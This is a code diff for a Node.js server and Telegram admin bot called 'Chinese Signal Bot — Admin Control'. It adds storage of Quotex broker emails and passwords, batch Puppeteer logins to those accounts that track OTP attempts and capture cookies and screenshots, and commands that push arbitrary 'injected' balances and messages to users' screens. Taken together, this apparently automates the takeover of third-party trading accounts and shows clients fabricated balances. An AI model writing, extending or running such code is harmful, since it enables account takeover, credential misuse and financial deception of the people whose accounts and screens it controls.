+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '📋 <b>Saved Credentials</b>\nNo credentials saved yet.',
+            reply_markup: { inline_keyboard: [[{ text: '➕ Add Credential', callback_data: 'cred_add' }],[{ text: '🔙 Back', callback_data: 'menu' }]] } });
+    }
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `📋 <b>Saved Credentials (${creds.length})</b>\nTap to manage:`,
+        reply_markup: tgCredsKeyboard(creds) });
 }
 
 async function tgHandleMessage(msg) {
@@ -914,6 +1384,68 @@ async function tgHandleMessage(msg) {
     }
 
     // ── Direct commands ───────────────────────────────────
+
+    if (text === '/users')   return tgCmdUsersMenu(chatId);
+    if (text === '/inject')  return tgCmdInjectMenu(chatId);
+    if (text === '/maint')   return tgCmdMaintenanceMenu(chatId);
+    if (text === '/creds')   return tgCmdCredsMenu(chatId);
+    if (text === '/orders')  return tgCmdOrdersMenu(chatId);
+    if (text === '/licenses' || text === '/lic') return tgCmdLicensesMenu(chatId);
+    if (text === '/settings') return tgCmdSettingsMenu(chatId);
+    if (text === '/retry')   return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `⚙️ <b>Auto-Retry Config</b>\nEnabled: <b>${autoRetryConfig.enabled}</b>\nMax: <b>${autoRetryConfig.maxAttempts}</b>\nDelay: <b>${autoRetryConfig.delaySeconds}s</b>`,
+        reply_markup: tgRetryConfigKeyboard() });
+
+    // /block username  /unblock username
+    if (text.startsWith('/block ')) {
+        const name = text.slice(7).trim();
+        const u = await tgFindUserByName(name);
+        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${name}</b> not found.` });
+        await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/block-user`, { licenceKey: u.licenceKey }).catch(() => {});
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🚫 Blocked <b>${name}</b>` });
+    }
+    if (text.startsWith('/unblock ')) {
+        const name = text.slice(9).trim();
+        const u = await tgFindUserByName(name);
+        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${name}</b> not found.` });
+        await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/unblock-user`, { licenceKey: u.licenceKey }).catch(() => {});
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Unblocked <b>${name}</b>` });
+    }
+    // /reload username  /kick username
+    if (text.startsWith('/reload ')) {
+        const name = text.slice(8).trim();
+        const sent = sendSSEToUser(name, 'force_reload', { timestamp: new Date().toISOString() });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sent ? `🔄 Reloaded <b>${name}</b>` : `⚠️ <b>${name}</b> not online.` });
+    }
+    if (text.startsWith('/kick ')) {
+        const name = text.slice(6).trim();
+        const k = name.trim().toLowerCase();
+        const client = sseUserClients.get(k);
+        if (client) {
+            try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
+            sseClients.delete(client); sseUserClients.delete(k);
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `👢 Kicked <b>${name}</b>` });
+        }
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ <b>${name}</b> not online.` });
+    }
+    // /balance username amount
+    if (text.startsWith('/balance ')) {
+        const parts2 = text.slice(9).trim().split(' ');
+        if (parts2.length < 2) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /balance username amount' });
+        const [bUser, bAmt] = parts2;
+        const sent = sendSSEToUser(bUser, 'inject_balance', { balance: bAmt });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sent ? `💰 Injected <b>${bAmt}</b> to <b>${bUser}</b>` : `⚠️ <b>${bUser}</b> not online.` });
+    }
+    // /inject username type  
+    if (text.startsWith('/msg ')) {
+        const m = text.slice(5).trim();
+        const [target2, ...msgParts] = m.split(' ');
+        const msgTxt = msgParts.join(' ');
+        if (!target2 || !msgTxt) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /msg username message text here' });
+        await tgInjectMessage(target2, 'info', msgTxt);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Message sent to <b>${target2}</b>` });
+    }
+
     if (text === '/start' || text === '/menu') {
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard(),
             text: '🤖 <b>Chinese Signal Bot — Admin Control</b>\n\nSend a <b>username</b> to manage that user, or pick an option.' });
@@ -1626,6 +2158,133 @@ app.get('/api/qx/history', async (req, res) => {
         }
         res.json([]);
     } catch(e) { res.json([]); }
+});
+
+
+// ================== SAVED CREDENTIALS API ==================
+app.get('/api/qx/credentials', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    try {
+        const creds = useDatabase ? await SavedCredential.find({}).sort({ createdAt: -1 }).lean() : savedCredsMemory;
+        res.json({ credentials: creds });
+    } catch(e) { res.json({ credentials: savedCredsMemory }); }
+});
+app.post('/api/qx/credentials', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const { email, password, label = '', group = 'Default', notes = '' } = req.body || {};
+    if (!email || !password) return res.status(400).json({ error: 'email and password required' });
+    const id   = 'cred_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6);
+    const cred = { id, label, email, password, group, notes, launchCount: 0, lastLaunched: null, createdAt: new Date() };
+    try {
+        if (useDatabase) await SavedCredential.create(cred);
+        else savedCredsMemory.unshift(cred);
+        broadcastSSE('cred_added', { id: cred.id, label, email, group });
+        res.json({ ok: true, credential: { id: cred.id, label, email, group } });
+    } catch(e) { res.status(500).json({ error: 'Server error' }); }
+});
+app.delete('/api/qx/credentials/:id', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const { id } = req.params;
+    try {
+        if (useDatabase) await SavedCredential.deleteOne({ id });
+        else savedCredsMemory = savedCredsMemory.filter(c => c.id !== id);
+        broadcastSSE('cred_deleted', { id });
+        res.json({ ok: true });
+    } catch(e) { res.status(500).json({ error: 'Server error' }); }
+});
+
+// ================== BATCH LAUNCH ==================
+app.post('/api/qx/batch-launch', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    if (!puppeteerAvailable) return res.status(503).json({ error: 'Puppeteer not available' });
+    const { credentialIds = [] } = req.body || {};
+    const allCreds = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
+    const tolaunch = credentialIds.length ? allCreds.filter(c => credentialIds.includes(c.id)) : allCreds;
+    const launched = [], skipped = [];
+    for (const c of tolaunch) {
+        const existing = [...quotexSessions.values()].find(s => s.email === c.email && !['closed','error','logged_in'].includes(s.status));
+        if (existing) { skipped.push({ email: c.email, reason: 'Session already ' + existing.status }); continue; }
+        const sid = makeSessionId();
+        const session = { id: sid, clientName: c.label || c.email.split('@')[0], email: c.email, password: c.password,
+            licenceKey: '', status: 'queued', statusMsg: 'Batch launched', startedAt: new Date(), updatedAt: new Date(),
+            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
+        quotexSessions.set(sid, session);
+        broadcastSSE('qx_session_new', getSessionInfo(session));
+        launchQuotexSession(session).catch(e => console.error('batch launch err:', e.message));
+        // Update launch stats
+        if (useDatabase) SavedCredential.findOneAndUpdate({ id: c.id }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {});
+        else { const cr = savedCredsMemory.find(x => x.id === c.id); if (cr) { cr.lastLaunched = new Date(); cr.launchCount = (cr.launchCount || 0) + 1; } }
+        launched.push({ sessionId: sid, email: c.email });
+        await new Promise(r => setTimeout(r, 600)); // stagger launches
+    }
+    res.json({ ok: true, launched, skipped, totalLaunched: launched.length });
+});
+
+// ================== SESSION NOTES ==================
+app.post('/api/qx/session-note', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const { sessionId, note } = req.body || {};
+    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
+    const session = quotexSessions.get(sessionId);
+    if (session) session.note = note || '';
+    if (useDatabase) BrokerSession.findOneAndUpdate({ sessionId }, { notes: note || '' }, { upsert: false }).catch(() => {});
+    broadcastSSE('qx_session_update', session ? getSessionInfo(session) : { id: sessionId });
+    res.json({ ok: true });
+});
+
+// ================== AUTO-RETRY CONFIG API ==================
+app.get('/api/qx/retry-config', (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    res.json(autoRetryConfig);
+});
+app.post('/api/qx/retry-config', (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const { enabled, maxAttempts, delaySeconds } = req.body || {};
+    if (enabled !== undefined) autoRetryConfig.enabled = !!enabled;
+    if (maxAttempts)           autoRetryConfig.maxAttempts = Math.min(10, Math.max(1, parseInt(maxAttempts)));
+    if (delaySeconds)          autoRetryConfig.delaySeconds = Math.min(300, Math.max(5, parseInt(delaySeconds)));
+    broadcastSSE('retry_config_updated', autoRetryConfig);
+    res.json({ ok: true, config: autoRetryConfig });
+});
+
+// ================== LAUNCH FROM CREDENTIAL ==================
+app.post('/api/qx/launch-from-cred', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    if (!puppeteerAvailable) return res.status(503).json({ error: 'Puppeteer not available' });
+    const { credId } = req.body || {};
+    if (!credId) return res.status(400).json({ error: 'credId required' });
+    const cred = useDatabase
+        ? await SavedCredential.findOne({ id: credId }).lean().catch(() => null)
+        : savedCredsMemory.find(c => c.id === credId);
+    if (!cred) return res.status(404).json({ error: 'Credential not found' });
+    const existing = [...quotexSessions.values()].find(s => s.email === cred.email && !['closed','error','logged_in'].includes(s.status));
+    if (existing) return res.json({ ok: false, sessionId: existing.id, message: 'Session already running' });
+    const sid = makeSessionId();
+    const session = { id: sid, clientName: cred.label || cred.email.split('@')[0], email: cred.email, password: cred.password,
+        licenceKey: '', status: 'queued', statusMsg: 'Launched from credential', startedAt: new Date(), updatedAt: new Date(),
+        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
+    quotexSessions.set(sid, session);
+    broadcastSSE('qx_session_new', getSessionInfo(session));
+    launchQuotexSession(session).catch(e => console.error('cred launch error:', e.message));
+    if (useDatabase) SavedCredential.findOneAndUpdate({ id: credId }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {});
+    else { const c = savedCredsMemory.find(x => x.id === credId); if (c) { c.lastLaunched = new Date(); c.launchCount = (c.launchCount || 0) + 1; } }
+    res.json({ ok: true, sessionId: sid, email: cred.email });
+});
+
+// ================== SESSION ACTIVITY EXPORT ==================
+app.get('/api/qx/export-sessions', async (req, res) => {
+    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const rows = [
+        ['Session ID','Client','Email','Status','Started','Notes'].join(','),
+        ...[...quotexSessions.values()].map(s => [
+            `"${s.id}"`, `"${(s.clientName||'').replace(/"/g,'""')}"`,
+            `"${(s.email||'').replace(/"/g,'""')}"`, `"${s.status}"`,
+            `"${s.startedAt?.toISOString?.() || ''}"`, `"${(s.note||'').replace(/"/g,'""')}"`
+        ].join(','))
+    ].join('\r\n');
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', `attachment; filename="sessions-${new Date().toISOString().slice(0,10)}.csv"`);
+    res.send(rows);
 });
 
 // ================== EXPORT USERS CSV ==================
